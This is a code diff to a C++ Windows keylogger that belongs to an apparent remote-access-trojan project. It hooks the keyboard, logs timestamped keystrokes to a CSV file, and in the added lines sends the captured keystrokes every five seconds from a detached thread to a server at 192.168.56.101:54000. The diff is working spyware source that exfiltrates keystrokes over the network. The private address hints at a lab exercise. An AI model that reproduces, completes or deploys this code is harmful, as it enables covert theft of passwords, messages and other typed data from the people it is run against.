@@ -10,11 +10,36 @@
 #include <vector>
 #include <sstream>
 #include <winuser.h>
+#include <C:\Users\thelab\development\RAT\network.h>
+#include <locale>
+#include <codecvt>
 
 HHOOK keyboardHook = NULL;
 std::vector<std::pair<std::string, std::wstring>> keystrokeVector;
+std::wstring_convert<std::codecvt_utf8<wchar_t>, wchar_t> converter; //Convert wstring to string
 std::unordered_map<DWORD, bool> keyStates;
 std::mutex bufferMutex; 
+NetworkClient client("192.168.56.101", 54000); 
+
+bool SendVectorToServer() {
+    
+    std::string keystrokeData;
+
+    for (const auto& entry : keystrokeVector) {
+        keystrokeData.append(entry.first)
+        .append(",")
+        .append(converter.to_bytes(entry.second))
+        .append("\n");
+    }
+    // clear the keystorke vector, also does this in WriteVectorToFile
+    if (keystrokeData.empty()) {
+        return true;
+    }
+    
+    return client.sendData(keystrokeData);
+}
+
+
 
 void WriteVectorToFile() {
     std::wofstream outFile("keystrokes.csv", std::ios::app);
@@ -35,6 +60,17 @@ void WriteVectorToFile() {
 void PeriodicVectorFlush() {
     while (true) {
         std::this_thread::sleep_for(std::chrono::seconds(5)); //Flush every 5 secs.
+        
+
+        if (!client.connectToServer()) {
+            std::cerr << "Failed to connect to server! \n";
+            continue; // try again next sleep periode 
+        }
+
+        if (!SendVectorToServer()) {
+            std::cerr << "Failed to send data to server! \n";
+        }
+        
         WriteVectorToFile();
     }
 }
@@ -58,15 +94,6 @@ wchar_t VirtualKeyTochar(DWORD vkCode, bool shiftPressed, bool altGrPressed, UIN
     } else {
         keyboardState[VK_SHIFT] = 0;
     }
-
-    // if (altGrPressed) {
-    //     keyboardState[VK_CONTROL] = 0x80;
-    //     keyboardState[VK_MENU] = 0x80;
-    //     std::cout << "ALTGR key was pressed.\n";
-    // } else {
-    //     keyboardState[VK_CONTROL] = 0;
-    //     keyboardState[VK_MENU] = 0;
-    // }
 
     // Can change size later if needed. 
     wchar_t buffer[256] = {0}; // Buffer holding the resulting unicode characters.
@@ -114,7 +141,8 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                         keypress = L"[VK:" + std::to_wstring(vkCode) + L"]";
                     }
 
-                    keystrokeVector.emplace_back(timestamp, keypress);               
+                    keystrokeVector.emplace_back(timestamp, keypress); 
+            
                  
             }
         
@@ -133,6 +161,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
 
 
 int main() {
+
     std::thread flushThread(PeriodicVectorFlush);
     flushThread.detach(); // Run the flushThread thread independently from the main thread. 
     
